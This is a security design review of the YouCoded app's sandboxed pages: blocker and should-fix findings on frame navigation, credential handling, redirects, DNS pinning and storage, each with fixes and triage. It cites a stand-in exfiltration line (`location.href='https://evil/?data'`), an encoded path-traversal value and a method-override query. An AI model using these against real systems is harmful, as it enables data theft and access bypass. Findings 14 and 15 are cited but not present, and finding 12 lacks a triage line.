"Verified" means I read the code (or ran a probe); "unverified" means I could not check it.

1. **Severity: blocker. The "frame can't navigate away" fix only exists on desktop; on Android and in a phone/remote browser the hole stays open, and on Android it is worse than today's design claims.**
   Claim: the design (section 4, section 8) closes frame self-navigation with an Electron `will-frame-navigate` guard and says the phone behaves the same. Promise 3 says "a page cannot get information out".
   Evidence: the guard lives in `main/main.ts:743-746`, which only exists in the Electron desktop window. The Android WebView routes every navigation through `app/src/main/kotlin/com/youcoded/app/ui/AppWebView.kt:82-84` into `WebViewUrlRouter.kt:~98-103` (`decide`): anything that is not a bundled `file:` page or a dev server returns `OPEN_EXTERNALLY`. So on Android, a page doing `location.href='https://evil/?data'` (if the WebView reports the sub-frame navigation, which I could not confirm: unverified) hands that address to the phone's browser with no question at all. In a phone's own browser (remote access) there is no host-side hook at all; CSP has no `navigate-to` in Chromium.
   Fix: (a) add to the plan an Android change in `shouldOverrideUrlLoading`: when `!request.isForMainFrame` and the URL is not `about:srcdoc`/`about:blank`, return true (block) and never open externally; add a Kotlin unit test beside `WebViewUrlRouterTest`. (b) For the remote browser, state plainly in the design and the architecture spec that frame self-navigation (including `<meta http-equiv=refresh>`) cannot be stopped there, and say what limits it (the remote door only serves pages the desktop already approved). Do not let "Parity" claim otherwise. (c) Add a dev-window check for the desktop path: a test page that tries `location.href`, `<meta refresh>` and a `<form>`, observed in `run-dev.sh`.
   Triage: accepted — Android: block sub-frame navigations in AppWebView/WebViewUrlRouter (Kotlin + router test); remote browser limit stated in both specs; dev-window probe added to the build checks.

2. **Severity: blocker. The `openSites` storage plan will lose data and can corrupt approvals as written.**
   Claim: section 3 puts `openSites` "beside the page's approvals in `page-connections.json`" with "the same writer".
   Evidence: `main/pages/connections-store.ts:260-261` `parseFile` returns only `{ pages, keys }`; `toFile` (`:253-255`) writes only those two; `cleanPages` (`:266-290`) treats EVERY value under `pages[pageKey]` as a connection approval and drops any entry without a string `fingerprint`; `cleanKeys` (`:292-302`) rebuilds records field by field. So an `openSites` field placed inside a page's record is dropped on the next read; a new top-level field is erased by the next `mutate()` (including by an older build sharing the same user data). `prune` (`:196-216`) also only knows pages and keys.
   Fix: add a top-level `openSites: Record<pageKey, string[]>` to `ConnectionsFile`/`ConnectionsSnapshot`, parse it with its own cleaner (lower-case, strip trailing dot, hostname shape, cap 50), carry it through `toFile`, delete it in `prune` and `removeApproval`-style page removal, and add a round-trip test (write sites, approve something, read sites back). Keep `VERSION = 1` only if an older build merely ignores the field; since an older build would erase it on its next write, say so or bump nothing and accept that.
   Triage: accepted — done before this review landed: top-level `openSites` in ConnectionsFile/Snapshot with its own cleaner, carried by toFile, pruned; older builds erase it on write (a site then asks again), stated in the store comment. Round-trip test to add.

3. **Severity: should-fix. The two new channels need Destin's sign-off to work on a phone, and the "opens on the computer" behaviour for a phone is probably not what he wants.**
   Claim: section 8 adds `pages:open-website` / `pages:forget-open-site` and says remote and Android behave the same, with `shell.openExternal` on the computer for remote access.
   Evidence: `tests/fixtures/phone-open-channels.json:137-150` pins every channel a phone may call, and `tests/phone-open-set.test.ts` fails if a new non-`desktopOnly` channel appears; its `_note` says the list changes only with Destin's approval. The design does not mention it. Existing `OPEN_EXTERNAL` is `desktopOnly` (`main/ipc/shell.ts:114-117`). `shared/capabilities.ts:95` says a remote screen has `openExternal: false`. So a person tapping a link on their phone browser would pop a browser on the desktop screen. On the local Android app the host bridge refuses `mailto:` (`app/src/main/kotlin/com/youcoded/app/runtime/BackendService.kt:190-192`: "Only web links can be opened."), and `shell` is not Electron there (use `platform.openExternal`, `main/electron-platform.ts:63`, `main/headless/electron-headless.ts:103`).
   Fix: (a) main's open handler must go through the runtime's `platform.openExternal`, not `import { shell }`; (b) when the screen's `capabilities.openExternal` is false (remote browser), the host opens the address itself from the click that confirmed (`window.open(url,'_blank','noopener')`) and calls the channel only to record "remember"; (c) mailto on the local Android app: either extend the host bridge to allow `mailto:` or tell the person it cannot open there; (d) list the two channels as an explicit decision for Destin (phone-open-channels.json) in the design, with the option of keeping them `desktopOnly` and doing remember-only on the phone through the host.
   Triage: accepted — main opens through `platform.openExternal`; a remote screen (capabilities.openExternal false) opens the address itself from the confirming click; mailto refused on the Android app with a plain sentence. Phone channel list is Destin's decision: asked in chat; until he answers both channels stay desktopOnly and a phone shows the ask without 'Don't ask again'.

4. **Severity: should-fix. "Already approved, so open without asking" would silently open ANY site for a page with the whole-internet connection, and has no rule for mailto.**
   Claim: section 3: "if its hostname is covered by one of the page's approved connections' addresses ... call openWebsite at once".
   Evidence: `main/pages/page-connections.ts:395-410` (`covers`): `case 'open': return true`, and a device covers a home address. If the host reuses `covers`, an `open` page never asks (the approved screen S-open-website promises an ask "unless the site is already approved"). A `mailto:` URL has an empty hostname, so "covered" and "remember" are meaningless for it; `PageOpenWebsite.tsx:~79-95` would print "Don't ask again for " with a blank site.
   Fix: write the rule down: silent only when an approved `public`/`key`/`youcoded`/`github` address equals the hostname, or the hostname is in `openSites`; never for `open`, `device`, `plaid`; mailto always asks and never offers "Don't ask again" (hide the switch). Put this in one pure function with a table test.
   Triage: accepted — one pure `opensWithoutAsking(page, url)`: silent only for an approved public/key/youcoded/github address or a remembered site; never for open/device/plaid; mailto always asks, no switch. Table test.

5. **Severity: should-fix. A credential (especially a new Basic password) can be sent in clear text, and the redirect check compares hosts only.**
   Claim: section 2: "`guardedFetch` already drops credential headers and query params off-host."
   Evidence: `main/harness/tools/net-guard.ts` (`guardedFetch`, `const onOrigin = host === originHost`) compares hostname only, not scheme or port. `main/pages/page-fetch.ts:~140-144` accepts `http:` for every connection kind, including `key` with a credential attached. So `http://api.example.com/...` (or an `https` to `http` redirect on the same host) sends the key, and under this design the Basic `user:password`, in clear text over the network.
   Fix: refuse `http:` for any connection that carries a credential (`key`, `github`, `youcoded`; allow it only for `device`, which is home-only), and make `onOrigin` compare the full origin (scheme + host + port) so a downgrade drops the credential. Add tests: https-to-http redirect keeps the request but loses the header; a key connection refuses an `http://` request.
   Triage: accepted — credentialed kinds refuse http:; guardedFetch compares full origin (scheme+host+port) for credential carry-over. Tests for both.

6. **Severity: should-fix. Redirects are never re-checked against the new `allow` rules (path and method).**
   Claim: the card says "Nothing else there can be reached."
   Evidence: `page-fetch.ts` `allowHost` (`:~205-209`) calls only `covers(connection, hostname)`; `guardedFetch` hands it `(hostname, hop, url)` but not the method, and the method can change on a redirect (`net-guard.ts` 303 / 301-302 rewrite). An allowed `POST /tasks` that is answered `307` to `/admin/delete` on the same host is followed with the same method and body and the same credential. Same gap exists today for `writePaths`.
   Fix: pass the current method into `allowHost` and re-run `methodAllowed(connection, method, hopUrl.pathname)` on every hop (refuse with the existing "sent on to" style message). Test: a 307 to a path outside `allow` is refused.
   Triage: accepted — allowHost receives the hop's method; every hop re-runs methodAllowed on its pathname (writePaths too).

7. **Severity: should-fix. The `allow` path rule is described for the manifest but not for the request side, so encoded and odd paths could slip through.**
   Claim: section 2: manifest `path` has no `%` and no `..`, "matched exactly or at a `/` boundary against the request's `pathname`".
   Evidence: the existing YouCoded rule rejects any `%` in the REQUEST pathname (`page-connections.ts:430-433`) because `new URL` only normalises literal `.`/`%2e` segments; `/calendars/%2e%2e%2fadmin` has a `/` boundary after `/calendars` and survives URL parsing, but a server may decode it to `/calendars/../admin`. The design says nothing about doing the same. Also unaddressed: `;` path parameters, doubled slashes, a trailing-slash difference in the fingerprint, and method-override carried in the query string (`?_method=DELETE`; the header form is already blocked by the three-name header allowlist, `page-fetch.ts:57`).
   Fix: in `methodAllowed` for `allow`, reject any request pathname containing `%`, `;`, `\` or `//`; normalise method to upper case and path to no trailing slash before sorting into the fingerprint; document `?_method=` as a service-side risk the `does` words cannot cover (page-builder skill note). Table-test all of these.
   Triage: accepted — with `allow`, a request pathname containing %, ;, \ or // is refused; recipe paths normalised (no trailing slash) before the fingerprint; `?_method=` noted in the page-builder skill.

8. **Severity: should-fix. Multi-part keys are stored under a record that cannot describe them, and two pages can overwrite each other's key.**
   Claim: section 2: parts are "saved as ONE SecretsStore value (JSON keyed by part id)" so `savedKey`/`deleteSavedKey` are "unchanged".
   Evidence: `PageKeyRecord` (`connections-store.ts:62-70`) only holds `in`/`param`/`scheme`, and `cleanKeys` (`:292-302`) drops any other field. `credentialFor` (`pages-service.ts:613-625`) uses the RECORDED placement, which cannot express "this part is the Basic user". The saved-key id is `service|address` and is shared across pages (`savedKeyId`, `:97`): page A (parts user/password) and page B (a single bearer key) for the same service and address share one slot, and `approve` with "saved" (`pages-service.ts:299-312`) only checks that SOME key exists, not that it has this page's part ids. A mismatched value sends garbage or, worse, the wrong part in a query string.
   Fix: record the parts layout (id, `in`, `param`) in `PageKeyRecord` at approval (extend `cleanKeys`); put the parts' ids in the saved-key identity or refuse "saved" unless the saved value has exactly this page's part ids; validate the typed JSON in `approve` itself (every id present, strings, length-capped, no CR/LF, no `:` in `basic-user`), since the renderer's check (`page-connections.tsx:~440-446`) is only a courtesy and the phone door sends `'saved'`. Update `deleteSavedKey`'s fingerprint-prefix match (`:~172`) only if the fingerprint prefix changes (it should not).
   Triage: accepted — PageKeyRecord records the parts layout at approval; 'saved' is refused unless the saved layout equals this line's; approve validates the typed JSON (all ids, strings, caps, no CR/LF, no ':' in basic-user).

9. **Severity: should-fix. Redaction does not cover the forms a Basic password or a JSON service will echo.**
   Claim: section 2: "redact every secret (each part's raw value, the Basic string and its base64)".
   Evidence: `page-fetch.ts` `redact` (`:~122-132`) only blanks the raw and `encodeURIComponent` forms, ignores anything under 4 characters, and does not blank JSON-escaped text (a password containing `"` or `\` is echoed as `\"`). `page-socket.ts:161-165` and the live socket/video code build their `secrets` list from the single `credential.value`/`credential.secret` (`:164-165`, `page-live-socket.ts:238`, `page-live-video.ts:131`) and would need the same multi-value change; the design names only `performApprovedFetch` and `page-socket.ts`.
   Fix: make `PageCredential.secrets` the one list every door reads (fetch, socket, live socket, video), and extend `redact` with the JSON-escaped form, base64 and base64url of the Basic string, and every part longer than 3 characters; lower the minimum for parts. Add a test where the service echoes the Authorization header in a JSON body.
   Triage: accepted — `secrets: string[]` on every credential and every door reads it (fetch, socket, live socket, video); redact adds JSON-escaped, base64 and base64url forms; values shorter than 4 characters are still not hunted (blanking every short string would wreck ordinary text; a sign-in that short is not realistic) — said honestly instead of the 1-character promise.

10. **Severity: should-fix. DNS pinning will work in Electron 41, but the plan has gaps that matter: the connection lifecycle, the home/IPv6 case, `all: true`, the Android Node, and how to test it.**
    Claim: section 5: per-hop `new Agent({ connect: { lookup } })` passed to `fetch`; fall back to undici's own `fetch` if Electron rejects it.
    Evidence (verified by probe, see top): Electron 41 bundles Node 24.18 with undici 7.28.0, the same version as `desktop/node_modules/undici` (`package-lock.json:13688`), so a npm `Agent` as `dispatcher` of the global `fetch` works today. But: (a) `connect.lookup` is called with `all: true` and must call back with an ARRAY; the old single-address callback form fails with an obscure error. (b) `guardedFetch` returns the `Response` to callers who read the body later (`readBodyCapped`), so an Agent created per hop cannot be closed inside the loop; it needs closing after the body is done, or sockets leak. (c) `assertHomeHttpUrl` (`net-guard.ts`) deliberately IGNORES IPv6 answers; the pinned lookup must return only the checked IPv4 set, or happy-eyeballs will dial an unchecked AAAA address (Tailscale names return `fd7a:` addresses). (d) The Android backend runs a different, bundled musl Node (`docs/android-runtime.md`); its built-in undici version is unknown (unverified), and a global `fetch` with a differently-versioned npm `Agent` is a known mismatch. (e) `assertPublicHttpUrl` returns only a `URL`, so the design must say how the checked addresses reach the lookup. (f) The proposed test ("fake lookup answers public then private") cannot connect to a loopback server because the guard itself refuses private addresses, and `guardedFetch` tests inject `fetchImpl`, which skips the dispatcher entirely.
    Fix (most reliable and simpler than per-hop agents): import BOTH `fetch` and `Agent` from the npm `undici` for `guardedFetch` when no `fetchImpl` is injected (same version by construction, works on Android's Node too). Create two module-level shared agents, `public` and `home`, whose `connect.lookup` does the resolve AND the private/home check at connect time and returns only the allowed addresses as an array. No per-hop agent, no lifecycle, no need to thread addresses out of `assertPublicHttpUrl`, and a rebind between check and connect is impossible because there is only one lookup. Keep the up-front check for the friendly error message. Add `undici` as an exact-pinned direct dependency. Test the lookup as a pure exported function (public then private answer, mixed answer, IPv6 for home) plus one test that wires a real `Agent` to a local server using an injected "treat 127.0.0.1 as public" predicate.
    Triage: accepted — npm undici fetch + two module-level Agents (public, home) whose connect.lookup resolves, checks and returns the allowed set as an array (home: IPv4 only); undici exact-pinned direct dependency; pure lookup tests + one real Agent test with an injected predicate.

11. **Severity: should-fix. The frame-name approach is plausible in Electron 41 but rests on three unverified event details; the design should prove it in a real window and have a fallback.**
    Claim: section 4: main records `frameTreeNodeId` for any subframe created with name `youcoded-page` from `frame-created`; `will-frame-navigate` then refuses anything but `about:srcdoc`/`about:blank`.
    Evidence: verified in `node_modules/electron/electron.d.ts`: `WebFrameMain` has `name`, `frameTreeNodeId`, `parent`, `top`; `frame-created` passes `details.frame`, which "may be `null` if accessed after the frame has either navigated or been destroyed" (`FrameCreatedDetails`); `will-frame-navigate` passes `frame`, `initiator`, `isMainFrame`. The existing Office guard (`main/office/office-frame-guard.ts`) does NOT use `frame-created`; it learns an id from the first navigation, so the `frame-created` + name path has no precedent in the repo. Unverified: that the iframe's `name` attribute is already set when `frame-created` fires for a React-rendered iframe (`PageHost.tsx:733-738` does not set `name` today); that `will-frame-navigate` fires for the initial `about:srcdoc` load; and that `meta refresh` and script navigations both reach it.
    Fix: record in BOTH places: on `frame-created` (read `name` synchronously) and, as a fallback, on the first `will-frame-navigate` of a frame whose `name` is `youcoded-page` and whose parent is the main frame. Reject (not just ignore) navigations from a recorded frame to anything but the two local URLs, and also treat `blob:`/`data:` as refused. Test with the pure decision function like Office, AND add a `run-dev.sh` check (a test page that tries `location.href`, `meta refresh`, `window.name = ...` then navigate). Keep the id Set bounded (clear when the frame's webContents is destroyed). Make sure `HtmlView.tsx:41` (same sandbox, other frames) is not named the same.
    Triage: accepted — record on frame-created AND first will-frame-navigate (name + parent is main frame); refuse blob:/data: too; bounded set cleared on destroy; HtmlView frames unnamed; dev-window probe.

12. **Severity: should-fix (unverified). Link hints (`preconnect`, `prefetch`, `dns-prefetch`) are not covered by the CSP the page carries.**
    Claim: audit/design say only the form and frame navigation holes remained; the policy is "connect-src none".
    Evidence: `renderer/components/pages/page-theme.ts:~455-474` (`pageCsp`) has no `prefetch-src` (not implemented in Chromium) and the only hint control is the `x-dns-prefetch-control` meta (`:633-634`), which turns off automatic anchor prefetching.     Fix: before building, probe it in the dev window (a page with those link tags and a local listener / DNS log). 13. **Severity: should-fix. The ask can be spammed and can be confirmed by accident.**
    Claim: section 3: "At most one ask at a time ... a second request while one is open is dropped ... No user-activation requirement."
    Evidence: `PageOpenWebsite.tsx:~54-60` is opened by a single `setOpenAsk(string)`; nothing stops the page from re-asking the moment the person cancels (a loop of popups the person can only escape by closing the page).     Fix: per-page back-off (after a Cancel, ignore asks from that page for ~30 s, and after three cancels offer "Stop this page asking" for the session); ignore Enter for the first ~600 ms after the dialog appears, or drop `onEnter` for this dialog; use a ref to enforce "one at a time" (the state setter would replace, not drop). Show the same whole address that main will open (it does; keep).
    Triage: accepted — no onEnter on this dialog; one-at-a-time via ref; after a Cancel a page's asks are ignored for 30 s.

## Answers to the specific questions

1. **Re-ask / registry drift:** no step changes an existing fingerprint as designed (verified by running the pin test on current code; the optional `allow`/`parts` segments are append-only). Risk is only in findings 8 and 15 (corpus coverage for the new segments and the unwired registry). Registry equality with the old switches: unverified until wired.
2. **Data out:** popups (closed by dropping `allow-popups`; today `main.ts:748-751` opens any https/mailto, confirmed), forms (`form-action 'none'`, `page-theme.ts:~469`, closed), frame navigation (desktop only, finding 1), images/media (only for the whole-internet connection by design, `img-src https:`; an `open` page can always leak this way, so the "ask" is not a boundary there, finding 4), prefetch/preconnect (finding 12, unverified), ask spam/Enter (13), mailto (3, 4), redirects and path matching (6, 7), Basic leaks (5, 9), DNS pinning (10). `frame-created`/`will-frame-navigate`/`frameTreeNodeId` exist in Electron 41 per its typings; name timing unverified (11).
3. **Undici:** works in Electron 41 (probe). Most reliable: shared agents with a connect-time validating lookup, `fetch` and `Agent` both from npm `undici` (finding 10).
4. **Parity:** only desktop is covered by the plan. Android needs a Kotlin change (1, 3); the remote browser cannot get the navigation guard (1) and should open links itself (3); a phone cannot reach the new channels without Destin's approval of the phone list (3).
5. **Screens vs design:** "Together" line misses remembered sites (14); S-open-website's per-site switch cannot apply to mailto (4); everything else on the approved screens has a matching backend item. The Page settings list of sites needs finding 2 to survive a restart.
6. **Simpler designs:** a shared connect-time-validating agent instead of per-hop pinned agents (10); host-side opening (phone) instead of a new phone channel (3); treat `open` and `mailto` as "always ask" instead of a coverage rule (4).
